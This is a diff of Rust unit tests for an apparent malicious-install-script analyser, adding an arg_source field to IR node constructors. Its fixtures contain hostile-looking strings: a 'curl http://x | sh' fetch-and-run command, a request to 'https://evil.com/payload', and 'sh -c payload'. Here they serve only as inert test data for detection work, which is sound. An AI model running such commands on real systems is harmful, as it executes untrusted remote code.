@@ -9,11 +9,11 @@ fn loc(file: &str, line: u32, col: u32) -> SourceLocation {
 #[test]
 fn stable_id_for_process_exec() {
     let n1 = IrNode::new(
-        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()), arg_source: Default::default() },
         loc("install.js", 10, 2),
     );
     let n2 = IrNode::new(
-        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()), arg_source: Default::default() },
         loc("install.js", 10, 2),
     );
     // Same inputs → same ID
@@ -25,11 +25,11 @@ fn stable_id_for_process_exec() {
 #[test]
 fn different_commands_same_line_get_distinct_ids() {
     let n1 = IrNode::new(
-        IrNodeKind::ProcessExec { command: Some("cmd1".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("cmd1".to_string()), arg_source: Default::default() },
         loc("install.js", 5, 0),
     );
     let n2 = IrNode::new(
-        IrNodeKind::ProcessExec { command: Some("cmd2".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("cmd2".to_string()), arg_source: Default::default() },
         loc("install.js", 5, 0),
     );
     assert_ne!(n1.id, n2.id);
@@ -55,7 +55,7 @@ fn stable_id_for_obfuscated_flow() {
 #[test]
 fn auto_tag_uses_literal_arg_when_command_known() {
     let node = IrNode::new(
-        IrNodeKind::ProcessExec { command: Some("ls -la".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("ls -la".to_string()), arg_source: Default::default() },
         loc("a.js", 1, 0),
     );
     assert!(node.tags.contains(&NodeTag::UsesLiteralArg));
@@ -65,7 +65,7 @@ fn auto_tag_uses_literal_arg_when_command_known() {
 #[test]
 fn auto_tag_dynamic_arg_when_no_command() {
     let node = IrNode::new(
-        IrNodeKind::ProcessExec { command: None },
+        IrNodeKind::ProcessExec { command: None, arg_source: Default::default() },
         loc("a.js", 1, 0),
     );
     assert!(node.tags.contains(&NodeTag::DynamicArg));
@@ -80,7 +80,7 @@ fn auto_tag_obfuscated_flow_gets_dynamic_arg() {
 #[test]
 fn with_tags_appends_without_duplicates() {
     let node = IrNode::with_tags(
-        IrNodeKind::ProcessExec { command: Some("ls".to_string()) },
+        IrNodeKind::ProcessExec { command: Some("ls".to_string()), arg_source: Default::default() },
         loc("a.js", 1, 0),
         vec![NodeTag::UsesLiteralArg, NodeTag::ObfuscatedContext],
     );
@@ -94,7 +94,7 @@ fn with_tags_appends_without_duplicates() {
 #[test]
 fn ir_node_roundtrips_json() {
     let node = IrNode::new(
-        IrNodeKind::NetworkRequest { url: Some("https://evil.com/payload".to_string()) },
+        IrNodeKind::NetworkRequest { url: Some("https://evil.com/payload".to_string()), arg_source: Default::default() },
         loc("install.js", 20, 4),
     );
     let json = serde_json::to_string(&node).unwrap();
@@ -108,7 +108,7 @@ fn file_ir_serializes_correctly() {
         file: "install.js".to_string(),
         nodes: vec![
             IrNode::new(
-                IrNodeKind::ProcessExec { command: Some("sh -c payload".to_string()) },
+                IrNodeKind::ProcessExec { command: Some("sh -c payload".to_string()), arg_source: Default::default() },
                 loc("install.js", 5, 2),
             ),
             IrNode::new(IrNodeKind::ObfuscatedFlow, loc("install.js", 7, 0)),
